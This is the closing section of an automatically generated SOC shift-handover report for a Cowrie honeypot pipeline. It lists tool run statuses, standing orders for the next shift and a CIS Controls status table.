| Tool 36  | Command Clustering          | ✅ 31 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 168 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 60 filtered (22.1%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 92 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 38 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 128 priority case(s) shown individually · 80 recon entry/entries in table (4 group(s) consolidating 8 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json (pipeline.yml tools) + data/tool_manifest_enriched.json (enriched_corpus.yml tools) — both auto-generated each run, together tracking all active tools across both workflows, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-11-08T17:26:20Z_
